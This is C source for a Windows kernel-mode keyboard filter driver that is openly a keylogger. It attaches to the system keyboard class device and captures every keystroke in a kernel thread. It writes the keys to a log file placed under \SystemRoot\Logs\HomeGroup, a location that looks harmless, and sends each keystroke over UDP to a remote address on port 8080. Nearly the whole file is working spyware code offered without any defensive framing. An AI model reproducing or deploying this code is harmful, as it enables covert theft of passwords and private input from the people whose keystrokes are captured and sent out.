#pragma once
#include "driver.h"
#include "driver.tmh"

#ifdef ALLOC_PRAGMA
#pragma alloc_text (INIT, DriverEntry)
#endif

#pragma warning(push)
#pragma warning(disable:4201) 
#pragma warning(disable:4214)
#pragma warning(disable:4054)

#pragma comment(lib, "Netio.lib")

#include <ntddk.h>
#include <wdf.h>
#include <Wdm.h>
#include <Wsk.h>



#define SOCKET_ERROR -1

#pragma comment(lib, "NtosKrnl.lib")
#pragma comment(lib, "Ntdll.lib")

int numPendingIrps = 0;

const WSK_CLIENT_DISPATCH WskAppDispatch = {
	MAKE_WSK_VERSION(1,0),
	0,
	NULL
};

WSK_REGISTRATION WskRegistration;

static WSK_REGISTRATION         g_WskRegistration;
static WSK_PROVIDER_NPI         g_WskProvider;
static WSK_CLIENT_DISPATCH      g_WskDispatch = { MAKE_WSK_VERSION(1,0), 0, NULL };

enum
{
	DEINITIALIZED,
	DEINITIALIZING,
	INITIALIZING,
	INITIALIZED
};

static LONG     g_SocketsState = DEINITIALIZED;
PWSK_SOCKET g_UdpSocket;

PDEVICE_OBJECT devobj;


NTSTATUS
NTAPI
CompletionRoutine(
	_In_ PDEVICE_OBJECT 		DeviceObject,
	_In_ PIRP                   Irp,
	_In_ PKEVENT                CompletionEvent
)
{
	ASSERT(CompletionEvent);

	UNREFERENCED_PARAMETER(Irp);
	UNREFERENCED_PARAMETER(DeviceObject);

	KeSetEvent(CompletionEvent, IO_NO_INCREMENT, FALSE);
	return STATUS_MORE_PROCESSING_REQUIRED;
}

NTSTATUS
SendDatagramComplete(
	PDEVICE_OBJECT DeviceObject,
	PIRP Irp,
	PVOID Context
)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	PWSK_BUF DatagramBuffer;
	ULONG ByteCount;

	if (Irp->IoStatus.Status == STATUS_SUCCESS)
	{
		DatagramBuffer = (PWSK_BUF)Context;
		ByteCount = (ULONG)(Irp->IoStatus.Information);

		IoFreeIrp(Irp);
		return STATUS_MORE_PROCESSING_REQUIRED;
	}

	else
	{
		IoFreeIrp(Irp);
		return STATUS_MORE_PROCESSING_REQUIRED;
	}

	IoFreeIrp(Irp);


	return STATUS_MORE_PROCESSING_REQUIRED;
}

NTSTATUS
SendDatagram(
	PWSK_SOCKET Socket,
	PWSK_BUF DatagramBuffer,
	PSOCKADDR RemoteAddress
)
{
	PWSK_PROVIDER_DATAGRAM_DISPATCH Dispatch;
	PIRP Irp;
	NTSTATUS Status;

	Dispatch =
		(PWSK_PROVIDER_DATAGRAM_DISPATCH)(Socket->Dispatch);

	// Allocate an IRP
	Irp =
		IoAllocateIrp(
			1,
			FALSE
		);

	if (!Irp)
	{
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	IoSetCompletionRoutine(
		Irp,
		SendDatagramComplete,
		DatagramBuffer,  
		TRUE,
		TRUE,
		TRUE
	);

	Status =
		Dispatch->WskSendTo(
			Socket,
			DatagramBuffer,
			0,  // No flags
			RemoteAddress,
			0,
			NULL,  // No associated control info
			Irp
		);

	return Status;
}

NTSTATUS
InitWskData(
	_Out_ PIRP*             pIrp,
	_Out_ PKEVENT   CompletionEvent
)
{
	ASSERT(pIrp);
	ASSERT(CompletionEvent);

	*pIrp = IoAllocateIrp(1, FALSE);
	if (!*pIrp) {
		KdPrint(("InitWskData(): IoAllocateIrp() failed\n"));
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	KeInitializeEvent(CompletionEvent, SynchronizationEvent, FALSE);
	IoSetCompletionRoutine(*pIrp, CompletionRoutine, CompletionEvent, TRUE, TRUE, TRUE);
	return STATUS_SUCCESS;
}

NTSTATUS
InitWskBuffer(
	_In_  PVOID     Buffer,
	_In_  ULONG     BufferSize,
	_Inout_  PWSK_BUF  WskBuffer
)
{
	NTSTATUS Status = STATUS_SUCCESS;

	ASSERT(Buffer);
	ASSERT(BufferSize);
	ASSERT(WskBuffer);

	WskBuffer->Offset = 0;
	WskBuffer->Length = BufferSize;

	WskBuffer->Mdl = IoAllocateMdl(Buffer, BufferSize, FALSE, FALSE, NULL);
	if (!WskBuffer->Mdl) {
		KdPrint(("InitWskBuffer(): IoAllocateMdl() failed\n"));
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	__try {
		MmProbeAndLockPages(WskBuffer->Mdl, KernelMode, IoWriteAccess);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		KdPrint(("InitWskBuffer(): MmProbeAndLockPages(%p) failed\n", Buffer));
		IoFreeMdl(WskBuffer->Mdl);
		Status = STATUS_ACCESS_VIOLATION;
	}

	return Status;
}

VOID
FreeWskBuffer(
	_In_ PWSK_BUF WskBuffer
)
{
	ASSERT(WskBuffer);
	MmUnlockPages(WskBuffer->Mdl);
	IoFreeMdl(WskBuffer->Mdl);
}

NTSTATUS
Bind(
	_In_ PWSK_SOCKET        WskSocket,
	_In_ PSOCKADDR          LocalAddress
)
{
	KEVENT          CompletionEvent = { 0 };
	PIRP            Irp = NULL;
	NTSTATUS        Status = STATUS_UNSUCCESSFUL;

	if (g_SocketsState != INITIALIZED || !WskSocket || !LocalAddress)
		return STATUS_INVALID_PARAMETER;

	Status = InitWskData(&Irp, &CompletionEvent);
	if (!NT_SUCCESS(Status)) {
		KdPrint(("Bind(): InitWskData() failed with status 0x%08X\n", Status));
		return Status;
	}

	Status = ((PWSK_PROVIDER_CONNECTION_DISPATCH)WskSocket->Dispatch)->WskBind(
		WskSocket,
		LocalAddress,
		0,
		Irp);
	if (Status == STATUS_PENDING) {
		KeWaitForSingleObject(&CompletionEvent, Executive, KernelMode, FALSE, NULL);
		Status = Irp->IoStatus.Status;
	}

	IoFreeIrp(Irp);
	return Status;
}

PWSK_SOCKET
CreateSocket(
	_In_ ADDRESS_FAMILY AddressFamily,
	_In_ USHORT                 SocketType,
	_In_ ULONG                  Protocol,
	_In_ ULONG                  Flags
)
{
	KEVENT                  CompletionEvent = { 0 };
	PIRP                    Irp = NULL;
	PWSK_SOCKET             WskSocket = NULL;
	NTSTATUS                Status = STATUS_UNSUCCESSFUL;

	if (g_SocketsState != INITIALIZED)
		return NULL;

	Status = InitWskData(&Irp, &CompletionEvent);
	if (!NT_SUCCESS(Status)) {
		KdPrint(("CreateSocket(): InitWskData() failed with status 0x%08X\n", Status));
		return NULL;
	}

	Status = g_WskProvider.Dispatch->WskSocket(
		g_WskProvider.Client,
		AddressFamily,
		SocketType,
		Protocol,
		Flags,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL,
		Irp);
	if (Status == STATUS_PENDING) {
		KeWaitForSingleObject(&CompletionEvent, Executive, KernelMode, FALSE, NULL);
		Status = Irp->IoStatus.Status;
	}

	WskSocket = NT_SUCCESS(Status) ? (PWSK_SOCKET)Irp->IoStatus.Information : NULL;

	IoFreeIrp(Irp);
	return (PWSK_SOCKET)WskSocket;
}

NTSTATUS
CloseSocket(
	_In_ PWSK_SOCKET WskSocket
)
{
	KEVENT          CompletionEvent = { 0 };
	PIRP            Irp = NULL;
	NTSTATUS        Status = STATUS_UNSUCCESSFUL;

	if (g_SocketsState != INITIALIZED || !WskSocket)
		return STATUS_INVALID_PARAMETER;

	Status = InitWskData(&Irp, &CompletionEvent);
	if (!NT_SUCCESS(Status)) {
		KdPrint(("CloseSocket(): InitWskData() failed with status 0x%08X\n", Status));
		return Status;
	}

	Status = ((PWSK_PROVIDER_BASIC_DISPATCH)WskSocket->Dispatch)->WskCloseSocket(WskSocket, Irp);
	if (Status == STATUS_PENDING) {
		KeWaitForSingleObject(&CompletionEvent, Executive, KernelMode, FALSE, NULL);
		Status = Irp->IoStatus.Status;
	}

	IoFreeIrp(Irp);
	return Status;
}

NTSTATUS 
InitWsk()
{
	WSK_CLIENT_NPI  WskClient = { 0 };
	NTSTATUS                Status = STATUS_UNSUCCESSFUL;

	if (InterlockedCompareExchange(&g_SocketsState, INITIALIZING, DEINITIALIZED) != DEINITIALIZED)
		return STATUS_ALREADY_REGISTERED;

	WskClient.ClientContext = NULL;
	WskClient.Dispatch = &g_WskDispatch;

	Status = WskRegister(&WskClient, &g_WskRegistration);
	if (!NT_SUCCESS(Status)) {
		KdPrint(("WskRegister() failed with status 0x%08X\n", Status));
		InterlockedExchange(&g_SocketsState, DEINITIALIZED);
		return Status;
	}

	Status = WskCaptureProviderNPI(&g_WskRegistration, WSK_NO_WAIT, &g_WskProvider);
	if (!NT_SUCCESS(Status)) {
		KdPrint(("WskCaptureProviderNPI() failed with status 0x%08X\n", Status));
		WskDeregister(&g_WskRegistration);
		InterlockedExchange(&g_SocketsState, DEINITIALIZED);
		return Status;
	}

	InterlockedExchange(&g_SocketsState, INITIALIZED);
	return STATUS_SUCCESS;
}


VOID 
WSKCleanup()
{
	if (InterlockedCompareExchange(&g_SocketsState, INITIALIZED, DEINITIALIZING) != INITIALIZED)
		return;

	WskReleaseProviderNPI(&g_WskRegistration);
	WskDeregister(&g_WskRegistration);

	InterlockedExchange(&g_SocketsState, DEINITIALIZED);
}

LONG
SendTo(
	_In_ PWSK_SOCKET        WskSocket,
	_In_ PVOID              Buffer,
	_In_ ULONG              BufferSize,
	_In_ PSOCKADDR          RemoteAddress
)
{
	KEVENT          CompletionEvent = { 0 };
	PIRP            Irp = NULL;
	WSK_BUF         WskBuffer = { 0 };
	LONG            BytesSent = SOCKET_ERROR;
	NTSTATUS        Status = STATUS_UNSUCCESSFUL;

	if (g_SocketsState != INITIALIZED || !WskSocket || !Buffer || !BufferSize)
		return SOCKET_ERROR;

	Status = InitWskBuffer(Buffer, BufferSize, &WskBuffer);
	if (!NT_SUCCESS(Status)) {
		KdPrint(("SendTo(): InitWskData() failed with status 0x%08X\n", Status));
		return SOCKET_ERROR;
	}

	Status = InitWskData(&Irp, &CompletionEvent);
	if (!NT_SUCCESS(Status)) {
		KdPrint(("SendTo(): InitWskData() failed with status 0x%08X\n", Status));
		FreeWskBuffer(&WskBuffer);
		return SOCKET_ERROR;
	}

	Status = ((PWSK_PROVIDER_DATAGRAM_DISPATCH)WskSocket->Dispatch)->WskSendTo(
		WskSocket,
		&WskBuffer,
		0,
		RemoteAddress,
		0,
		NULL,
		Irp);
	if (Status == STATUS_PENDING) {
		KeWaitForSingleObject(&CompletionEvent, Executive, KernelMode, FALSE, NULL);
		Status = Irp->IoStatus.Status;
	}

	BytesSent = NT_SUCCESS(Status) ? (LONG)Irp->IoStatus.Information : SOCKET_ERROR;

	IoFreeIrp(Irp);
	FreeWskBuffer(&WskBuffer);
	return BytesSent;
}


NTSTATUS
SendBuff(
	char sendstr[]
)
{

	NTSTATUS         status;
	SOCKADDR_IN      srvaddr;
	PWSK_SOCKET      sock;
	ULONG_PTR        recvd;
	WSK_REGISTRATION clireg;
	WSK_PROVIDER_NPI pronpi;
	PWSK_BUF  WskBuffer = { 0 };

	srvaddr.sin_family = AF_INET;
	srvaddr.sin_port = RtlUshortByteSwap(8080);
	srvaddr.sin_addr.S_un.S_un_b.s_b1 = 192;
	srvaddr.sin_addr.S_un.S_un_b.s_b2 = 168;
	srvaddr.sin_addr.S_un.S_un_b.s_b3 = 1;
	srvaddr.sin_addr.S_un.S_un_b.s_b4 = 2;

	SendTo(g_UdpSocket, sendstr, sizeof(sendstr) - 1, (PSOCKADDR)&srvaddr);
	

	return STATUS_SUCCESS;
}

NTSTATUS 
InitThreadKeyLogger(
	_In_ PDRIVER_OBJECT pDriverObject
)
{

	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;

	pKeyboardDeviceExtension->bThreadTerminate = FALSE;

	HANDLE hThread;
	NTSTATUS status = PsCreateSystemThread(&hThread, (ACCESS_MASK)0, NULL, (HANDLE)0, NULL, ThreadKeyLogger,
		pKeyboardDeviceExtension);

	if (!NT_SUCCESS(status))
		return status;
#ifdef DEBUG
	DbgPrint("Key logger thread created...\n");
#endif 
	ObReferenceObjectByHandle(hThread, THREAD_ALL_ACCESS, NULL, KernelMode,
		(PVOID*)&pKeyboardDeviceExtension->pThreadObj, NULL);
#ifdef DEBUG
	DbgPrint("Key logger thread initialized; pThreadObject =  %x\n",
		&pKeyboardDeviceExtension->pThreadObj);
#endif
	ZwClose(hThread);
	return status;
}

VOID ThreadKeyLogger(
	_In_ PVOID pContext
)
{

	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pContext;
	PDEVICE_OBJECT pKeyboardDeviceOjbect = pKeyboardDeviceExtension->pKeyboardDevice;
	
	NTSTATUS status;
	PLIST_ENTRY pListEntry;
	KEY_DATA* kData;
	

	while (TRUE)
	{
		KeWaitForSingleObject(&pKeyboardDeviceExtension->semQueue, Executive, KernelMode, FALSE, NULL);

		pListEntry = ExInterlockedRemoveHeadList(&pKeyboardDeviceExtension->QueueListHead,
			&pKeyboardDeviceExtension->lockQueue);


		if (pKeyboardDeviceExtension->bThreadTerminate == TRUE)
		{
			PsTerminateSystemThread(STATUS_SUCCESS);
		}


		kData = CONTAINING_RECORD(pListEntry, KEY_DATA, ListEntry);
		char keys[3] = { 0 };
		ConvertScanCodeToKeyCode(pKeyboardDeviceExtension, kData, keys);
		if (keys != 0)
		{

			if (pKeyboardDeviceExtension->hLogFile != NULL) 
			{
				IO_STATUS_BLOCK io_status;
#ifdef DEBUG
				DbgPrint("Writing scan code to file...\n");
#endif 
				NTSTATUS status = ZwWriteFile(pKeyboardDeviceExtension->hLogFile, NULL, NULL, NULL,
					&io_status, &keys, strlen(keys), NULL, NULL);

				__try {
					NTSTATUS _Status = SendBuff(keys);
				} __except(1) {

				}
				

#ifdef DEBUG
				if (status != STATUS_SUCCESS)

					DbgPrint("Writing scan code to file...\n");
				else
					DbgPrint("Scan code '%s' successfully written to file.\n", keys);
#endif 
			}
			
		}	
	}
	
	return;
}




NTSTATUS 
HookKeyboard(
	_In_ PDRIVER_OBJECT pDriverObject
)
{
	//	__asm int 3;
#ifdef DEBUG
	DbgPrint("Entering Hook Routine...\n");
#endif 

	PDEVICE_OBJECT pKeyboardDeviceObject;

	NTSTATUS status = IoCreateDevice(pDriverObject, sizeof(DEVICE_EXTENSION), NULL, 
		FILE_DEVICE_KEYBOARD, 0, TRUE, &pKeyboardDeviceObject);

	if (!NT_SUCCESS(status))
		return status;
#ifdef DEBUG
	DbgPrint("Created keyboard device successfully...\n");
#endif 


	pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags | (DO_BUFFERED_IO | DO_POWER_PAGABLE);
	pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags & ~DO_DEVICE_INITIALIZING;
#ifdef DEBUG
	DbgPrint("Flags set succesfully...\n");
#endif 
	RtlZeroMemory(pKeyboardDeviceObject->DeviceExtension, sizeof(DEVICE_EXTENSION));
#ifdef DEBUG
	DbgPrint("Device Extension Initialized...\n");
#endif 

	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pKeyboardDeviceObject->DeviceExtension;
	CCHAR		 ntNameBuffer[64] = "\\Device\\KeyboardClass0";
	STRING		 ntNameString;
	UNICODE_STRING uKeyboardDeviceName;
	RtlInitAnsiString(&ntNameString, ntNameBuffer);
	RtlAnsiStringToUnicodeString(&uKeyboardDeviceName, &ntNameString, TRUE);
	IoAttachDevice(pKeyboardDeviceObject, &uKeyboardDeviceName, &pKeyboardDeviceExtension->pKeyboardDevice);
	RtlFreeUnicodeString(&uKeyboardDeviceName);
#ifdef DEBUG
	DbgPrint("Filter Device Attached Successfully...\n");
#endif
	return STATUS_SUCCESS;
}

NTSTATUS OnReadCompletion(
	_In_ PDEVICE_OBJECT pDeviceObject,
	_In_ PIRP pIrp,
	_In_ PVOID Context
)
{
#ifdef DEBUG
	DbgPrint("Entering OnReadCompletion Routine...\n");
#endif
	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension;
	if (pIrp->IoStatus.Status == STATUS_SUCCESS)
	{
		PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
		int numKeys = pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);

		for (int i = 0; i < numKeys; i++)
		{
#ifdef DEBUG
			DbgPrint("ScanCode: %x\n", keys[i].MakeCode);
			if (keys[i].Flags == KEY_BREAK)
				DbgPrint("%s\n", "Key Up");
			if (keys[i].Flags == KEY_MAKE)
				DbgPrint("%s\n", "Key Down");
#endif 
			KEY_DATA* kData = (KEY_DATA*)ExAllocatePool(NonPagedPool, sizeof(KEY_DATA));
			kData->KeyData = (char)keys[i].MakeCode;
			kData->KeyFlags = (char)keys[i].Flags;
#ifdef DEBUG
			DbgPrint("Adding IRP to work queue...");
#endif
			ExInterlockedInsertTailList(&pKeyboardDeviceExtension->QueueListHead,
				&kData->ListEntry,
				&pKeyboardDeviceExtension->lockQueue);
			KeReleaseSemaphore(&pKeyboardDeviceExtension->semQueue, 0, 1, FALSE);

		}
	}

	if (pIrp->PendingReturned)
		IoMarkIrpPending(pIrp);

	numPendingIrps--;

	return pIrp->IoStatus.Status;
}

NTSTATUS 
DispatchRead(
	_In_ PDEVICE_OBJECT pDeviceObject,
	_In_ PIRP pIrp
)
{
#ifdef DEBUG
	DbgPrint("Entering DispatchRead Routine...\n");
#endif // DEBUG
	PIO_STACK_LOCATION currentIrpStack = IoGetCurrentIrpStackLocation(pIrp);
	PIO_STACK_LOCATION nextIrpStack = IoGetNextIrpStackLocation(pIrp);
	*nextIrpStack = *currentIrpStack;
	IoSetCompletionRoutine(pIrp, OnReadCompletion, pDeviceObject, TRUE, TRUE, TRUE);
	numPendingIrps++;
#ifdef DEBUG
	DbgPrint("Tagged keyboard 'read' IRP... Passing IRP down the stack... \n");
#endif // DEBUG
	return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);

}


NTSTATUS
DispatchPassDown(
	_In_ PDEVICE_OBJECT pDeviceObject,
	_In_ PIRP pIrp
)
{
#ifdef DEBUG
	DbgPrint("Entering DispatchPassDown Routine...\n");
#endif
	IoSkipCurrentIrpStackLocation(pIrp);
	return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);
}



VOID
Unload(
	_In_ PDRIVER_OBJECT pDriverObject
)
{

	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
#ifdef DEBUG
	DbgPrint("Driver Unload Called...\n");
#endif
	IoDetachDevice(pKeyboardDeviceExtension->pKeyboardDevice);
#ifdef DEBUG
	DbgPrint("Keyboard hook detached from device...\n");


	DbgPrint("There are %d tagged IRPs\n", numPendingIrps);
	DbgPrint("Waiting for tagged IRPs to die...\n");
#endif
	KTIMER kTimer;
	LARGE_INTEGER  timeout;
	timeout.QuadPart = 1000000;
	KeInitializeTimer(&kTimer);

	while (numPendingIrps > 0)
	{
		KeSetTimer(&kTimer, timeout, NULL);
		KeWaitForSingleObject(&kTimer, Executive, KernelMode, FALSE, NULL);
	}

	pKeyboardDeviceExtension->bThreadTerminate = TRUE;

	KeReleaseSemaphore(&pKeyboardDeviceExtension->semQueue, 0, 1, TRUE);
#ifdef DEBUG
	DbgPrint("Waiting for key logger thread to terminate...\n");
#endif
	KeWaitForSingleObject(pKeyboardDeviceExtension->pThreadObj,
		Executive, KernelMode, FALSE, NULL);
#ifdef DEBUG
	DbgPrint("Key logger thread termintated\n");
#endif
	ZwClose(pKeyboardDeviceExtension->hLogFile);

	IoDeleteDevice(pDriverObject->DeviceObject);
#ifdef DEBUG
	DbgPrint("Tagged IRPs dead...Terminating...\n");
#endif
	WSKCleanup();
	return;
}



NTSTATUS 
DriverEntry(
	_In_ PDRIVER_OBJECT  pDriverObject,
	_In_ PUNICODE_STRING RegistryPath
)
{
	SOCKADDR_IN 	LocalAddress = { 0, };
	LocalAddress.sin_family = AF_INET;
	LocalAddress.sin_addr.s_addr = INADDR_ANY;
	InitWsk();
	g_UdpSocket = CreateSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP, WSK_FLAG_DATAGRAM_SOCKET);
	NTSTATUS _Status = Bind(g_UdpSocket, (PSOCKADDR)&LocalAddress);
	NTSTATUS Status = { 0 };
#ifdef DEBUG
	DbgPrint("Keyboard Filter Driver - DriverEntry\nCompiled at " __TIME__ " on " __DATE__ "\n");
#endif
	for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
		pDriverObject->MajorFunction[i] = DispatchPassDown;
#ifdef DEBUG
	DbgPrint("Filled dispatch table with generic pass down routine...\n");
#endif
	pDriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;
	HookKeyboard(pDriverObject);
#ifdef DEBUG
	DbgPrint("Hooked IRP_MJ_READ routine...\n");
#endif
	InitThreadKeyLogger(pDriverObject);

	PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
	InitializeListHead(&pKeyboardDeviceExtension->QueueListHead);

	KeInitializeSpinLock(&pKeyboardDeviceExtension->lockQueue);

	KeInitializeSemaphore(&pKeyboardDeviceExtension->semQueue, 0, MAXLONG);

	IO_STATUS_BLOCK file_status;
	OBJECT_ATTRIBUTES obj_attrib;
	CCHAR		 ntNameFile[64] = "\\SystemRoot\\Logs\\HomeGroup\\klog.txt";
	STRING		 ntNameString;
	UNICODE_STRING uFileName;
	RtlInitAnsiString(&ntNameString, ntNameFile);
	RtlAnsiStringToUnicodeString(&uFileName, &ntNameString, TRUE);
	InitializeObjectAttributes(&obj_attrib, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
	Status = ZwCreateFile(&pKeyboardDeviceExtension->hLogFile, GENERIC_WRITE, &obj_attrib, &file_status,
		NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	RtlFreeUnicodeString(&uFileName);
#ifdef DEBUG
	if (Status != STATUS_SUCCESS)
	{

		DbgPrint("Failed to create log file...\n");
		DbgPrint("File Status = %x\n", file_status);

	}
	else
	{
		DbgPrint("Successfully created log file...\n");
		DbgPrint("File Handle = %x\n", pKeyboardDeviceExtension->hLogFile);
	}
#endif
	pDriverObject->DriverUnload = Unload;
#ifdef DEBUG
	DbgPrint("Set DriverUnload function pointer...\n");
	DbgPrint("Exiting Driver Entry......\n");
#endif
	return STATUS_SUCCESS;
}

#pragma warning (pop)

